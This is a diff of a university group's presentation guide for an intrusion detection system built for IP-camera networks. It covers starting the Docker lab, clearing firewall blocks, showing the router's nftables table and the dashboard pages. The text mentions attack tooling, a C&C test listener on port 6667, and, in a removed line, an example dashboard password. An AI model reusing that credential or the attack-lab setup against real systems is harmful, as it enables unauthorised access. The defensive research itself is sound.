@@ -2,1810 +2,1552 @@
 
 **Project:** Real-Time Intrusion Detection and Autonomous Response System for IP-Camera IoT Networks Using Machine Learning  
 **Group:** Group 03 — University of Sri Jayewardenepura  
-**Reference Document:** [`docs/requirements_checklist.md`](file:///d:/intrusion%20detection/docs/requirements_checklist.md)  
-**Supporting Architecture:** [`A_TO_Z_SYSTEM_FLOW.md`](file:///d:/intrusion%20detection/A_TO_Z_SYSTEM_FLOW.md)  
-**Date:** November 2026  
+**Reference Document:** [`docs/requirements_checklist.md`](docs/requirements_checklist.md)  
+**Supporting Architecture:** [`A_TO_Z_SYSTEM_FLOW.md`](A_TO_Z_SYSTEM_FLOW.md)  
+**Date:** 13 November 2026 (every command below was run on the virtual lab on this day, in Windows PowerShell 5.1)
 
 ---
 
 > 🌐 **Language:** English | [**සිංහල මාර්ගෝපදේශය (Sinhala Version) මෙතැනින් බලන්න**](PROGRESS_MEETING_PRESENTATION_GUIDE_SI.md)
 
 > 🎯 **Purpose of this Guide:**  
-> During the Progress Meeting with the supervisors (Dr. A.A.M. Matheeh & Dr. Senaka Amarakeerthi), this guide provides the exact terminal commands, verified outputs, and presentation scripts to prove that all **Functional Requirements (FR-01 to FR-08)**, **Proposal Table 9 Acceptance Targets**, **Research Objectives (O1 to O6)**, and **Research Questions (RQ1 to RQ5 & Hypothesis H1)** are 100% practically achieved, **following the exact sequence of [`docs/requirements_checklist.md`](docs/requirements_checklist.md)**.
+> During the Progress Meeting with the supervisors (Dr. A.A.M. Matheeh & Dr. Senaka Amarakeerthi), this guide gives the exact terminal commands, the real outputs, and short presentation scripts for every Functional Requirement (FR-01 to FR-08), every Proposal Table 9 target, the Research Objectives (O1 to O6), and the Research Questions (RQ1 to RQ5 & Hypothesis H1), **in the order of [`docs/requirements_checklist.md`](docs/requirements_checklist.md)**.
+>
+> It shows two things clearly and separately:
+> - **what is built and works on real packets in the virtual lab**, and
+> - **what still needs the hardware lab with a real camera** (Steps 20, 35–39).
 >
 > ⚠️ **Presentation Principle:**  
-> No black-box wrapper scripts or opaque shortcuts are used. For every single proof:
+> No black-box wrapper scripts for the attacks: we use standard tools (`curl`, `nmap`, `nping`, `nc`). For every proof:
 > 1. **💡 Why We Are Doing This (Requirement & Objective)**
 > 2. **⚙️ What Happens Under the Hood When Run**
 > 3. **💻 Direct Raw Command (Terminal)**
 > 4. **🔍 Line-by-Line Code Breakdown**
-> 5. **📋 Verified Output**
-> 6. **📊 Output Breakdown (Explaining every returned metric/field)**
-> 7. **🔬 Scientific Meaning & Proof**
+> 5. **📋 Real Output (13 Nov 2026)**
+> 6. **📊 Output Breakdown**
+> 7. **🔬 What It Proves (and what it does not prove)**
 > 8. **🗣️ Spoken English Script for the Supervisor**
+
+> 🧾 **Numbers that change on every run:** latency, confidence, flow counts, timer values and timestamps change from run to run. The outputs below are real outputs from 13 Nov 2026. Read the numbers from the screen during the meeting; do not read them from this guide.
 
 ---
 
 # Table of Contents
 
-1. [Pre-Meeting Lab Initialization (Cold Start)](#1-pre-meeting-lab-initialization-cold-start)
-# 2. Part 1: Functional Requirements Verification (FR-01 to FR-08)
-   - [FR-01: Live Packet Capture & Flow Extraction (Schema Test)](#fr-01-live-packet-capture--flow-extraction-must--schema-test)
-   - [FR-02: Calibrated Multi-Class ML Inference & Real-Time Attack Detection (Live Attack Suite)](#fr-02-calibrated-multi-class-ml-inference--real-time-attack-detection-must--live-attack-suite)
-   - [FR-03: Benign, Attack & Mitigation Database Storage (DB Retention Test)](#fr-03-database-storage-for-benign-attacks--mitigations-must--db-test)
-   - [FR-04: Authenticated Dashboard & WebSocket Push (Zero Refresh Test)](#fr-04-authenticated-dashboard--real-time-websocket-push-must--socketio-test)
-   - [FR-05: Controlled Subnet Nmap Asset Discovery (Inventory Test)](#fr-05-controlled-nmap-asset-discovery-should--inventory-test)
-   - [FR-06: Router Firewall Ruleset, Auto-Expiry & Timers (Firewall Test)](#fr-06-router-firewall-ruleset-auto-expiry--timers-must--firewall-test)
-   - [FR-07: Immutable Allowlists & System Audit Trail (Safety & Audit Test)](#fr-07-immutable-allowlists-thresholds--audit-trail-must--safety-test)
-   - [FR-08: Filtered Forensic Incident Log Export (RFC 4180 CSV Test)](#fr-08-filtered-forensic-log-export-should--export-test)
-3. [Part 2: Acceptance Targets Verification (Proposal Table 9 Targets)](#3-part-2-acceptance-targets-verification-proposal-table-9-targets)
-   - [Target 1: Classification Quality (Macro-F1 ≥ 0.85 on Unseen Data)](#target-1-classification-quality-macro-f1--085-on-held-out-scenario)
-   - [Target 2: Benign Safety (Zero Video Disruption & FPR ≤ 5%)](#target-2-benign-safety-zero-video-disruption--benign-safety)
-   - [Target 3: Decision Latency (Median < 2.0 s Target)](#target-3-decision-latency-median--20-s-target)
-   - [Target 4: Throughput & Resource Efficiency](#target-4-throughput--resource-efficiency)
-   - [Target 5: Reliability & Clean State Recovery](#target-5-reliability--clean-state-recovery)
-   - [Target 6: Usability & Administrative Audit Compliance](#target-6-usability--administrative-audit-compliance)
-4. [Part 3: Research Objectives Verification (Objectives O1 to O6 - Table 3)](#4-part-3-research-objectives-verification-objectives-o1-to-o6)
-5. [Part 4: Hypotheses and Research Questions (Hypothesis H1 & RQ1 to RQ5)](#5-part-4-hypotheses-and-research-questions-hypothesis-h1--rq1-to-rq5)
-6. [Part 5: Automated Test Suite (313 Tests Passed)](#6-part-5-automated-test-suite-313-tests-passed)
-7. [Part 6: Live Manual Attack Playbook](#7-part-6-live-manual-attack-playbook)
+1. [Status at a Glance (read this first)](#0-status-at-a-glance-read-this-first)
+2. [Pre-Meeting Lab Initialization (Cold Start)](#1-pre-meeting-lab-initialization-cold-start)
+3. [Part 1: Functional Requirements Verification (FR-01 to FR-08)](#2-part-1-functional-requirements-verification-fr-01-to-fr-08)
+   - [FR-01: Live Packet Capture & Flow Extraction](#fr-01-live-packet-capture--flow-extraction-must--schema-test)
+   - [FR-02: Multi-Class ML Inference & Live Attack Detection](#fr-02-multi-class-ml-inference--live-attack-detection-must--live-attack-suite)
+   - [FR-03: Database Storage](#fr-03-database-storage-for-benign-attacks--mitigations-must--db-test)
+   - [FR-04: Authenticated Dashboard & WebSocket Push](#fr-04-authenticated-dashboard--real-time-websocket-push-must--socketio-test)
+   - [FR-05: Controlled Nmap Asset Discovery](#fr-05-controlled-nmap-asset-discovery-should--inventory-test)
+   - [FR-06: Router Firewall Rules, Expiry & Timers](#fr-06-router-firewall-rules-expiry--timers-must--firewall-test)
+   - [FR-07: Allowlists, Thresholds & Audit Trail](#fr-07-allowlists-thresholds--audit-trail-must--safety-test)
+   - [FR-08: Filtered Log Export](#fr-08-filtered-forensic-log-export-should--export-test)
+4. [Part 2: Proposal Table 9 Targets](#3-part-2-proposal-table-9-targets)
+5. [Part 3: Research Objectives (O1 to O6)](#4-part-3-research-objectives-o1-to-o6)
+6. [Part 4: Hypothesis H1 and Research Questions RQ1 to RQ5](#5-part-4-hypothesis-h1-and-research-questions-rq1-to-rq5)
+7. [Part 5: Automated Test Suite (314 Tests)](#6-part-5-automated-test-suite-314-tests)
+8. [Part 6: Live Manual Attack Playbook](#7-part-6-live-manual-attack-playbook)
+9. [Part 7: Questions the Supervisor May Ask](#8-part-7-questions-the-supervisor-may-ask)
+
+---
+
+# 0. Status at a Glance (read this first)
+
+| Item | State on 13 Nov 2026 | Evidence |
+| :--- | :--- | :--- |
+| FR-01 to FR-08 | **Built and shown on real packets in the virtual lab.** FR-05 uses the real Nmap binary on the lab network. | Part 1 of this guide; `reports/fr_tests/` |
+| Table 9 — Classification | **Met on the classes present:** macro-F1 0.8595 on held-out 34-1. **But 34-1 is not a clean test** (it was opened and studied before). 5-class macro-F1 0.6876. | `reports/experiments/model_card.md` |
+| Table 9 — Benign safety | **Partly.** Camera, NVR and admin PC were never blocked; NVR recording kept going. **FPR on real camera traffic is not measured yet** (needs the hardware lab, Step 20). | Target 2 |
+| Table 9 — Latency | **Met in the virtual lab** for "Zeek line → dashboard" (median 0.141 s, 95% 0.636 s, Step 37 report). The wait for Zeek to finish a long flow is extra and is reported. | `reports/performance/virtual/` |
+| Table 9 — Throughput | **Enough for the virtual lab** (model about 14,000–23,000 flows/s in a batch; lab peak 500 flows/s). Zeek capture loss **0.0%** since the snap-length fix (D-058). | Target 4 |
+| Table 9 — Reliability | **Backend restart recovery shown.** Full Step 38 tests (router reboot, power loss) not done. | Target 5 |
+| Table 9 — Usability / audit | **Manual block, unblock and audit shown.** The formal admin task test (Step 39) not done. | Target 6 |
+| H1 | **Not confirmed yet.** Part 1 met on the classes-present number (with the 34-1 warning); Part 2 (FPR ≤ 5% on our camera) not tested. | Part 4 |
 
 ---
 
 # 1. Pre-Meeting Lab Initialization (Cold Start)
 
-Two minutes before sharing your screen with the supervisor, execute the following commands in PowerShell to initialize the system:
-
----
-
-#### 1. Boot up All 11 Docker Containers in the Background:
-
-> 1. **💡 Why We Are Doing This (Requirement & Objective)**
-To spin up the official Virtual Lab Topology (11 isolated containers and 2 virtual bridge networks) specified in Proposal Section 5.1 from an empty, clean state.
+Ten minutes before sharing your screen, run the steps below in PowerShell in the project folder (`D:\intrusion detection`).
 
 > [!IMPORTANT]
-> **Prerequisite:** Ensure **Docker Desktop** is running on your Windows PC.
+> **Prerequisite:** Docker Desktop is running, and MongoDB is running on `localhost:27017`.
 
-> 2. **⚙️ What Happens Under the Hood When Run**
-The Docker daemon parses `lab_virtual/docker-compose.yml`, builds/attaches the two Linux bridge networks (`br-ids-lan` for 192.168.50.0/24 and `br-ids-out` for 10.10.10.0/24), and starts all 11 isolated containers in detached mode (`-d`).
+---
+
+#### 1. Start All 11 Docker Containers:
+
+> 1. **💡 Why:** To start the virtual lab of Proposal Section 5.1 (Step 5): camera, NVR, admin PC, router, Zeek sensor, attacker, cloud server and the IDS scanner.
+
+> 2. **⚙️ Under the hood:** Docker reads `lab_virtual/docker-compose.yml`, makes 3 networks (camera LAN `192.168.50.0/24` on bridge `br-ids-lan`, outside network `10.10.10.0/24` on bridge `br-ids-out`, and a small `mgmt` network that only carries the SSH port from Windows to the router), and starts 11 containers.
 
 ```powershell
-# Option 1: Using the Project Lab CLI (Recommended):
+# Option 1: the project's lab controller (recommended)
 .venv\Scripts\python.exe lab_virtual\lab.py up
 
-# Option 2: Using Raw Docker Compose Directly:
+# Option 2: Docker Compose directly
 docker compose -f lab_virtual\docker-compose.yml up -d
+
+# Check: list the running containers
+docker ps --format "table {{.Names}}\t{{.Status}}"
 ```
 
-##### 🔍 Line-by-Line Breakdown:
-- `.venv\Scripts\python.exe lab_virtual\lab.py up`: Project controller command that provisions networks, mounts Zeek logs volume, and boots all 11 containers.
-- `docker compose -f lab_virtual\docker-compose.yml up -d`: Directly launches all 11 lab containers defined in `docker-compose.yml` in detached mode.
-
-> 5. **📋 Verified Output**
+> 5. **📋 Real Output (`docker ps`, 13 Nov 2026):**
 ```text
-[+] Running 11/11
- ✔ Network lab_virtual_camlan       Created
- ✔ Network lab_virtual_outside      Created
- ✔ Container ids-lab-router         Started
- ✔ Container ids-lab-camera         Started
- ✔ Container ids-lab-nvr            Started
- ✔ Container ids-lab-admin          Started
- ✔ Container ids-lab-attacker       Started
- ✔ Container ids-lab-sensor         Started
- ✔ Container ids-lab-scanner        Started
- ✔ Container ids-lab-cloud          Started
- ✔ Container ids-lab-camera2        Started
- ✔ Container ids-lab-camera3        Started
- ✔ Container ids-lab-camera4        Started
+NAMES                   STATUS
+ids-lab-nvr             Up 3 hours
+ids-lab-admin           Up 3 hours
+ids-lab-sensor          Up 3 hours
+ids-lab-camera          Up 3 hours
+ids-lab-cloud           Up 3 hours
+ids-lab-attack-server   Up 3 hours
+ids-lab-scanner         Up 3 hours
+ids-lab-router          Up 3 hours
+ids-lab-camera-net      Up 3 hours
+ids-lab-attacker        Up 3 hours
+ids-lab-cloud-net       Up 3 hours
 ```
 
-> 6. **📊 Output Breakdown (Explaining every returned metric/field)**
-- `Network Created`: Linux virtual bridges created for the camera LAN (`camlan`) and outside network (`outside`).
-- `Started (11/11)`: All 11 virtual nodes (IP Camera, NVR, Zeek Sensor, Linux Router, Admin PC, Scanner, Attacker, Cloud) running without errors.
-
----
-
-#### 2. Start Python IDS Backend & Web Dashboard on Port 5000 in the Background:
-
-> 1. **💡 Why We Are Doing This (Requirement & Objective)**
-Starts the live streaming pipeline runner tailing Zeek logs, loads the Random Forest classifier, connects SSH router mitigation adapter, and launches the Flask + Socket.IO dashboard on Port 5000.
+> 6. **📊 Output Breakdown:**
+- `ids-lab-router` (192.168.50.1 / 10.10.10.1): Linux router with the project's `nftables` table; SSH on `127.0.0.1:2222`.
+- `ids-lab-sensor`: Zeek, listening on bridge `br-ids-lan` (it has no IP address on the camera LAN).
+- `ids-lab-camera` (192.168.50.30): camera simulator — web page on port 80, video stream on port 554, cloud status every 30 s.
+- `ids-lab-nvr` (192.168.50.20): records the camera stream in 5-minute segments.
+- `ids-lab-admin` (192.168.50.10): opens the camera web page every 60 s.
+- `ids-lab-scanner` (192.168.50.5): runs the IDS's approved Nmap scans (FR-05).
+- `ids-lab-attacker` (10.10.10.50): has `nmap`, `nping` and `nc`.
+- `ids-lab-attack-server`: shares the attacker's address; web server with the harmless test program `/bins/lab_test.x86`.
+- `ids-lab-cloud` (10.10.10.123): the camera's normal cloud server (TCP 443, UDP 123, UDP 53).
+- `ids-lab-camera-net`, `ids-lab-cloud-net`: small helper containers that hold the network settings for the camera and the cloud.
+- The network names in Docker are `ids-lab_camlan`, `ids-lab_outside` and `ids-lab_mgmt`.
 
 > [!NOTE]
-> In Windows PowerShell 5.1, `Start-Process` does not support `-Environment`. Use Method 1 (`lab.py ids-start`) or Method 2 ($env: lines followed by Start-Process).
+> **After a change to `sensor/local.zeek`** (for example the snap-length fix of 13 Nov 2026, D-058), restart only the sensor: `docker restart ids-lab-sensor`. Zeek then starts a new `conn.log`; the backend notices this by itself ("Log truncation detected" in `lab_virtual\ids_backend.log`) and keeps reading. Never empty `conn.log` by hand while Zeek runs.
 
-> 2. **⚙️ What Happens Under the Hood When Run**
-Python runs `core_engine/app.py`, loads production model `ml_engine/models/ids_bundle_v3.joblib`, initializes MongoDB collections, starts background thread `runner.py` tailing `conn.log`, and opens Socket.IO on port 5000.
+---
+
+#### 2. Start the IDS Backend & Dashboard on Port 5000:
+
+> 1. **💡 Why:** Starts the live pipeline (reads Zeek's `conn.log` and `files.log`), loads the Random Forest bundle, connects to the router over SSH, and serves the dashboard on port 5000.
+
+> 2. **⚙️ Under the hood:** `lab.py ids-start` sets `IDS_SETTINGS_FILE=lab_virtual/settings.lab.yaml`, `DB_NAME=iot_ids_lab` and `PORT=5000`, starts `python -m core_engine.app` in the background, saves the PID in `lab_virtual/ids_backend.pid`, waits for `/api/health`, and starts the pipeline. At start-up the backend compares the database blocklist with the router (startup recovery).
 
 ```powershell
-# Method 1: Using the Project Lab CLI (Recommended - Supported on All PowerShell Versions):
 .venv\Scripts\python.exe lab_virtual\lab.py ids-start
-
-# Method 2: Direct Windows PowerShell 5.1 Raw Background Launch:
-$env:IDS_SETTINGS_FILE="lab_virtual/settings.lab.yaml"; $env:DB_NAME="iot_ids_lab"; $env:PORT="5000"; $env:HOST="127.0.0.1"
-Start-Process .venv\Scripts\python.exe -ArgumentList "-m core_engine.app"
 ```
 
-##### 🔍 Line-by-Line Breakdown:
-- `lab_virtual\lab.py ids-start`: Configures environment variables (`IDS_SETTINGS_FILE`, `DB_NAME`, `PORT`), launches backend process detached, saves PID to `lab_virtual/ids_backend.pid`, and verifies health on `/api/health`.
-- `$env:...`: Configures PowerShell environment variables in the parent process.
-- `Start-Process ... -ArgumentList "-m core_engine.app"`: Spawns the backend engine in the background, inheriting environment variables.
+> [!NOTE]
+> In Windows PowerShell 5.1, `Start-Process` has no `-Environment` option. Use `lab.py ids-start`. Start the backend **only once** (stop it first with `lab.py ids-stop` if it is already running).
 
-> 5. **📋 Verified Output**
+> 5. **📋 Real Output:**
 ```text
-IDS backend running (pid 14328), database iot_ids_lab; pipeline start: 200 running
-Dashboard: http://localhost:5000 (served by the backend)  login in lab_virtual\keys\dashboard_login.txt
+IDS backend running (pid 25256), database iot_ids_lab; pipeline start: 200 running
+Dashboard: http://localhost:5000 (served by the backend)  login in D:\intrusion detection\lab_virtual\keys\dashboard_login.txt
 ```
 
 ---
 
-#### 3. Verify Router Firewall Readiness (`nftables`):
+#### 3. Clean the Lab Before the Demo (very important):
 
-> 1. **💡 Why We Are Doing This (Requirement & Objective)**
-To verify that the Linux kernel `nftables` tables, allowlists, and dynamic drop sets are active in the router container before presenting to the supervisor.
+> 1. **💡 Why:** Old blocks or old test servers change the results:
+> - A block left from an earlier test drops the attacker's packets at the router, so a new attack is not seen.
+> - A C&C test server left running on port 6667 (`lab_server.py --role cnc`) makes the camera's C&C tries **succeed**. Short successful connections raised **no alert** in our test on 13 Nov. A leftover server also stops `nc -lp 6667` from opening the port.
 
-> 2. **⚙️ What Happens Under the Hood When Run**
-Queries `nft list table inet ids` inside the `ids-lab-router` container over the Docker IPC bridge to print active kernel filtering chains and sets.
+```powershell
+# 1. Stop any C&C test server left from an earlier run (it is fine if this prints nothing):
+docker exec ids-lab-attack-server pkill -f "lab_server.py --role cnc"
+
+# 2. Remove all blocks and rate-limits (database and router together):
+.venv\Scripts\python.exe lab_virtual\lab.py reset
+```
+
+> 5. **📋 Real Output:**
+```text
+removed 0 block(s) through the IDS
+router sets now: {'block_src': [], 'block_dst': [], 'limit_src': []}
+```
+
+> Run `lab.py reset` again **between the attack tests** in FR-02.
+
+---
+
+#### 3b. Fresh Backend Start After Any Rehearsal (very important for FR-02):
+
+> 1. **💡 Why:** The model's window features remember what each source did in the **last 60 minutes** (for example `pair_fail_1h` = failed tries from the same source to the same address). Every rehearsal from the attacker `10.10.10.50` adds to this memory. After several floods and scans in the same hour, a new scan can look like C&C. On 13 Nov 2026 the same subnet sweep gave **CnC 0.52 and a block** after about an hour of repeated tests, and **PortScan 0.84** right after a backend restart. `lab.py reset` clears the firewall, **not** this memory.
+
+> 2. **⚙️ Under the hood:** the window memory (`WindowState`) and the policy's repeat counter live only in the backend's memory, so a restart starts them empty (issue 41). The database and the router are not changed by the restart; startup recovery keeps them in step.
+
+```powershell
+.venv\Scripts\python.exe lab_virtual\lab.py ids-stop
+.venv\Scripts\python.exe lab_virtual\lab.py ids-start
+```
+
+> 5. **📋 Real Output:**
+```text
+IDS backend stopped
+IDS backend running (pid 20864), database iot_ids_lab; pipeline start: 200 running
+```
+
+> **Rules for the demo:**
+> - Do this after the last rehearsal, just before the meeting.
+> - Run the FR-02 tests **once each, in the order 2.1 → 2.2 → 2.3 → 2.4 → 2.5**, with `lab.py reset` between them. (The scan before the flood: thousands of flood flows from the attacker would change how the next scan looks.)
+> - To repeat an attack, do the fresh backend start again first.
+
+---
+
+#### 4. Check the Router Firewall (`nftables`):
+
+> 1. **💡 Why:** To show the router's kernel firewall table before any attack.
+
+> 2. **⚙️ Under the hood:** `docker exec` runs `nft list table inet ids` inside the router container. The table comes from `sensor/ids_router.nft`, loaded when the router starts.
 
 ```powershell
 docker exec ids-lab-router nft list table inet ids
 ```
 
-##### 🔍 Line-by-Line Breakdown:
-- `docker exec ids-lab-router`: Executes a shell command inside the running router container.
-- `nft list table inet ids`: Dumps the `ids` firewall table in the `inet` (IPv4/IPv6) family.
-
-> 5. **📋 Verified Output**
+> 5. **📋 Real Output:**
 ```text
 table inet ids {
-    set allow {
-        type ipv4_addr
-        elements = { 192.168.50.1, 192.168.50.5,
-                     192.168.50.10, 192.168.50.20 }
-    }
+	set allow {
+		type ipv4_addr
+		elements = { 192.168.50.1, 192.168.50.5,
+			     192.168.50.10, 192.168.50.20 }
+	}
 
-    set block_src {
-        type ipv4_addr
-        flags timeout
-    }
+	set block_src {
+		type ipv4_addr
+		flags timeout
+	}
 
-    set block_dst {
-        type ipv4_addr
-        flags timeout
-    }
+	set block_dst {
+		type ipv4_addr
+		flags timeout
+	}
 
-    set limit_src {
-        type ipv4_addr
-        flags timeout
-    }
+	set limit_src {
+		type ipv4_addr
+		flags timeout
+	}
 
-    chain forward {
-        type filter hook forward priority filter; policy accept;
-        ip saddr @allow accept
-        ip saddr @block_src drop
-        ip daddr @block_dst drop
-        ip saddr @limit_src limit rate over 200/second burst 5 packets drop
-    }
+	chain forward {
+		type filter hook forward priority filter; policy accept;
+		ip saddr @allow accept
+		ip saddr @block_src drop
+		ip daddr @block_dst drop
+		ip saddr @limit_src limit rate over 200/second burst 5 packets drop
+	}
 }
 ```
 
-> 6. **📊 Output Breakdown (Explaining every returned metric/field)**
-- **`set allow` (Hardcoded Immutable Management Allowlist):** Contains the 4 critical infrastructure IP addresses permanently immune to blocking (`policy: ACCEPT`):
-  - **`192.168.50.1` (Core Router & Gateway - `ids-lab-router`):** Default gateway routing packets between LAN and WAN. Never blocked to prevent total network routing failure.
-  - **`192.168.50.5` (IDS Scanner - `ids-lab-scanner`):** Sensor management port running approved Nmap discovery scans (FR-05). Protected so its audit scans are never misidentified as malicious reconnaissance.
-  - **`192.168.50.10` (Admin Workstation - `ids-lab-admin`):** Security administrator's workstation used to manage the IDS dashboard and camera Web UI. Protected to prevent administrator lockout.
-  - **`192.168.50.20` (NVR Server - `ids-lab-nvr`):** Video recorder ingesting RTSP camera streams over port 554. Protected to guarantee zero surveillance recording disruption.
-  *(Note: The Camera at `192.168.50.30` is protected by the Local-Network Guardrail, ensuring only external destination IPs are dropped).*
-- **`set block_src` & `set block_dst`:** Dynamic kernel drop sets with auto-expiry timers (`flags timeout`), currently empty and ready to drop malicious source or destination IPs.
-- **`set limit_src`:** Dynamic kernel set with expiration timers for DDoS/DoS traffic rate-limiting (`flags timeout`).
-- **`chain forward`:** Kernel forwarding chain configured to prioritize allowlist elements (`ip saddr @allow accept`), drop blacklisted IPs (`block_src`/`block_dst`), and rate-limit floods (`limit rate over 200/second burst 5 packets drop`).
+> 6. **📊 Output Breakdown:**
+- **`set allow`** — the 4 management addresses that are never blocked (`settings.lab.yaml` → `allowlist`):
+  - `192.168.50.1` — router / gateway.
+  - `192.168.50.5` — IDS sensor management port (here: the scanner container that runs the approved Nmap scans).
+  - `192.168.50.10` — admin workstation.
+  - `192.168.50.20` — NVR.
+- **The camera `192.168.50.30` is NOT on the allowlist.** It is protected from **automatic** blocks by a different rule: `lab.local_networks` (the whole camera LAN). For a C&C case, the policy blocks the outside address, never the camera.
+- **`block_src` / `block_dst`** — drop sets with a timer (`flags timeout`); empty now.
+- **`limit_src`** — rate-limit set for an outside DDoS source (decision D-055); packets over 200 per second are dropped.
+- **`chain forward`** — the order matters: allowlist first, then the drop sets, then the rate-limit.
 
 ---
 
-#### 4. Open SOC Web Dashboard in Browser and Overview of the 7 Pages:
+#### 5. Open the Dashboard and the 7 Pages:
 
-##### 💡 Why We Use the Web Dashboard:
-While the terminal proves raw backend pipelines and ML inferences, the dashboard gives the supervisor an intuitive, real-time Security Operations Center (SOC) visual interface with zero-refresh WebSocket updates.
+Open **`http://localhost:5000`** in Chrome or Edge:
+- **Username:** `labadmin`
+- **Password:** the second word in `lab_virtual/keys/dashboard_login.txt` (do not show this file on screen).
 
-##### 🌐 Accessing the Dashboard (Login):
-Open Chrome or Edge, navigate to **`http://localhost:5000`**, and sign in:
-- **Username:** `labadmin`  
-- **Password:** Stored in `lab_virtual/keys/dashboard_login.txt` (e.g., `idsadmin2026!`).
+| Page | Address | What to show (real labels) |
+| :--- | :--- | :--- |
+| 🖥️ Overview | `/overview` | **SYSTEM STATUS (MEASURED)** card: pipeline status, model version **v3.1.0**, **MONITORED FLOWS**, "Time per flow, Zeek line to dashboard (median / 95%)"; **ATTACK CLASS DISTRIBUTION** chart |
+| 🚨 Live Alerts | `/alerts` | New alert cards arrive without refresh; badge **MODEL PREDICTION**; class, confidence, response status; **CONFIRM INCIDENT** button |
+| 📜 Attack History | `/history` | Saved events from MongoDB, with class filter |
+| 📷 Devices & Scans | `/devices` | **TRIGGER NMAP** button; IP, MAC / vendor, open ports, camera heuristic, **MARK CAMERA** |
+| 🛡️ Blocklist | `/mitigations` | Active blocks and rate-limits, **EXPIRES AT** time, **UNBLOCK** button, **ENFORCE BLOCK** form |
+| ⚙️ Settings | `/settings` | Minimum-confidence slider (30%), repeats (3 in 60 s), rule time (30 min), allowlist; automatic response shown as **ON/OFF (read only — set in the YAML settings file)**; **SAVE OPERATIONAL SETTINGS** |
+| 📥 Logs & Export | `/export` | Type, class and date filters; **EXPORT RFC 4180 CSV** and **EXPORT STRUCTURED JSON** buttons; audit log table |
 
-##### 📑 The 7 Canonical Dashboard Pages (Main Navigation Tabs):
-Use these 7 pages during the presentation to demonstrate each aspect of the system:
-1. 🖥️ **Overview (`/overview`)**: System health, active model bundle version (v3.1.0), and empirical median latency (~115 ms).
-2. 🚨 **Live Alerts (`/alerts`)**: Pushes real-time attack alert cards over WebSockets within ~0.11 s of detection.
-3. 📜 **Attack History (`/history`)**: Historical incidents stored in MongoDB with full feature distributions.
-4. 📷 **Devices & Scans (`/devices`)**: Subnet asset discovery inventory with multi-evidence camera heuristic flags.
-5. 🛡️ **Blocklist / Mitigations (`/mitigations`)**: Live firewall drop table showing active blocked IPs and countdown timers.
-6. ⚙️ **Settings (`/settings`)**: Detection confidence thresholds, repeat counters (3 within 60s), and allowlist inspection.
-7. 📥 **Logs & Export (`/export`)**: Forensic export engine generating RFC 4180 CSV and structured JSON files.
+The top bar shows a green dot and **SOCKET.IO LIVE** when the live connection is open.
 
 ---
 
-### 💡 Key Concept to Clarify to the Supervisor Upfront: Why We Built This Virtual Testbed
+### 💡 Key Concept to Clarify Upfront: Why We Built This Virtual Testbed
 
-If the supervisor asks: **"Is this purely simulated? What is this Virtual Lab?"**, clarify using this exact technical explanation:
+If the supervisor asks: **"Is this purely simulated?"**
 
-#### 1. Core Rationale (Per Proposal Section 5.1):
-* As formally stated in Research Proposal Section 5.1, the evaluation requires a controlled testbed where attack vectors can be safely and repeatably injected.
-* To test 1,000 pkts/s DDoS floods, Mirai C&C botnets, and malware binary drops safely without risking physical camera damage or university network blocks.
+#### 1. Reason (Proposal Section 5.1, decision D-053):
+* The evaluation needs a separated network where attacks can be run safely and repeated (Proposal 5.1 allows "an IP camera or a camera simulator").
+* The virtual lab lets us run the whole real system before the hardware lab is ready.
 
-#### 2. What is 100% Real vs What is Simulated:
-* **100% Real Components:**
-- **Real Network Packets:** Live binary Ethernet frames traversing Linux Bridge interfaces (`br-ids-lan`, `br-ids-out`).
-- **Real Zeek Security Sensor:** Standard Zeek sniffer capturing raw AF_PACKET sockets and computing TCP state machine metrics.
-- **Real Machine Learning Model (v3.1.0):** 100-tree Random Forest trained on Stratosphere IoT-23 computing real-time inference.
-- **Real Linux nftables Router Firewall:** Live Linux kernel netfilter tables enforcing active drop sets and timer expirations.
-- **Real React SOC Dashboard & WebSockets:** Live browser UI receiving Socket.IO telemetry on Port 5000.
-- **Real Nmap Scanner:** Real Nmap binary executing automated subnet discovery.
-* **Simulated Network Entities:**
-- **Network Endpoints:**
-- **IP Camera (`ids-lab-camera` / `192.168.50.30`):** Lightweight container hosting HTTP Web GUI (Port 80) and RTSP video stream (Port 554).
-- **NVR Recorder (`ids-lab-nvr` / `192.168.50.20`):** Ingests RTSP streams and records continuous 58.6 MB video segments.
-- **Admin Workstation (`ids-lab-admin` / `192.168.50.10`):** Authorized management plane endpoint.
-- **Attacker Laptop (`ids-lab-attacker` / `10.10.10.50`):** External WAN node generating port scans, SYN floods, and C&C listeners.
+#### 2. What is real and what is simulated:
+* **Real:**
+  - **Network packets** on Linux bridges (`br-ids-lan`, `br-ids-out`).
+  - **Zeek** capturing those packets and writing `conn.log`, `files.log`, `http.log`.
+  - **The Random Forest model v3.1.0** (trained on IoT-23) making live predictions.
+  - **Linux `nftables`** in the router container, changed over SSH.
+  - **The React dashboard** with Socket.IO on port 5000, and **MongoDB**.
+  - **Nmap / nping / netcat / curl** binaries.
+* **Simulated:**
+  - **The camera** (`192.168.50.30`): a Python program with a web page (port 80) and a video-like stream (port 554, about 200 KB/s). It is not a real camera.
+  - **The NVR, admin PC, cloud server and attacker** are small containers.
+  - **No IoT-23 benign device is an IP camera** (proposal 2.3), and the camera here is a simulator. So the benign false-positive rate on **real camera traffic** must still be measured in the hardware lab (Step 20).
 
-#### 3. Opening Spoken English Statement for Supervisors:
-> *"Good morning Sir. Before demonstrating our live intrusion detection and autonomous response, I would like to clarify our testbed setup."*  
-> *"As formally approved in our research proposal Section 5.1, we have implemented the complete end-to-end architecture inside a realistic Docker virtual testbed."*  
-> *"Sir, in this testbed: the network packets, Zeek sensor, Random Forest ML classifier (v3.1.0), Linux nftables router firewall, and the React dashboard are all 100% REAL. The network endpoints—our IP camera, NVR recorder, and outside attacker—are containerized simulations so we can safely evaluate high-rate attacks without risking physical hardware damage. Final physical camera validation will be conducted in the hardware lab as per our proposal timeline."*
+#### 3. Opening Statement:
+> *"Good morning Sir. Before the demonstration I would like to explain our test setup. As planned in proposal Section 5.1, we built the complete system in a Docker virtual lab. The packets, the Zeek sensor, the Random Forest model v3.1.0, the nftables router firewall, MongoDB and the dashboard are real. The camera, NVR, admin PC and attacker are simulated containers, so we can run attacks safely. The real-camera tests, including the benign false-positive rate, will be done in the hardware lab as planned."*
 
 ---
 
 # 2. Part 1: Functional Requirements Verification (FR-01 to FR-08)
-
-Demonstrate the functional requirements sequentially following **[`docs/requirements_checklist.md`](docs/requirements_checklist.md)**:
 
 ---
 
 ### FR-01: Live Packet Capture & Flow Extraction (Must / Schema Test)
 
 > **Proposal Requirement:** "Capture mirrored or inline traffic, and make connection flows from it."  
